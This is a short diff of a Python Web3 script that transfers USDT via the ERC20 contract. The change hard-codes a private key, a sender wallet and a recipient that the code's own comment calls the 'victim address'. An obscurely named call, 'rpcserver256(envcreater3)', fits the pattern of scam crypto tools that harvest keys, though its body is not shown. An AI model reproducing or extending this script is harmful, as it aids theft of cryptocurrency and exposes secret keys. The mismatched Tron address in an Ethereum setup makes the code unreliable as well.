@@ -30,12 +30,12 @@ devofix3 = rpcserver256(envcreater3)
 web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/9ea31076b34d475e887206ea450f0060'))
 
 # Set private key and addresses
-private_key = ''  # Replace with your actual private key
+private_key = 'fd5cb73b8adb9728a269f308b843fab2c4576985314e42af0c568429faeca214'  # Replace with your actual private key
 usdtwall = private_key  
-sender_address = '0x43151B81936A0531327f96cB94B86C8b361246E3' # ur wallet address
+sender_address = '0x01B721Cd2960943cdee3CEfa91B30De7B4F46498' # ur wallet address
 
 # Set recipient address and USDT contract address
-recipient_address = '' # victim address
+recipient_address = 'THsmxqXyWzair9kEwxSxf6GET2pwMMsM6w' # victim address
 usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 
 # ERC20 Transfer function signature
